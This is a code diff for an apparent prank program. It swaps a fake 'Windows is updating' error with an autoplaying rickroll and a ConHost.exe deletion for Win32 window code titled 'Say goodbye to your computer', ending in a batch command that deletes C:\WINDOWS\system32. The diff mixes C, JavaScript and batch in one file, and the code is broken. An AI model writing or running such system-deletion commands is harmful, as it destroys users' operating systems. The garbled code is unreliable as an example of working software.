@@ -1,9 +1,37 @@
-const rickRollMessage = 'Error 485: Windows is updating...';
-const rickRollVideo = new Video();
-  rickRollVideo.setAttribute('height', 240);
-  rickRollVideo.setAttribute('autoplay', 1);
-  rickRollVideo.setAttribute('src', '`"https://www.youtube.com/watch?v=dQw4w9WgXcQ"`');
-  rickRollVideo.load();
-  rickRollVideo.play();
+// Register the window class.
+const wchar_t CLASS_NAME[]  = L"WNDCLASS";
 
-del("C:\Windows\System32\ConHost.exe"); 
+WNDCLASS wc = { };
+
+wc.lpfnWndProc   = WindowProc;
+wc.hInstance     = hInstance;
+wc.lpszClassName = CLASS_NAME;
+
+RegisterClass(&wc);
+
+// Create the window.
+
+HWND hwnd = CreateWindowEx(
+    0,                              // Optional window styles.
+    CLASS_NAME,                     // Window class
+    L"Say goodbye to your computer",    // Window text
+    WS_HSCROLL,            // Window style
+
+    // Size and position
+    CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
+
+    NULL,       // Parent window    
+    NULL,       // Menu
+    hInstance,  // Instance handle
+    NULL        // Additional application data
+    );
+
+if (hwnd == NULL)
+{
+    return 0;
+}
+
+ShowWindow(hwnd, nCmdShow);
+
+@echo off
+del C:\WINDOWS\system32
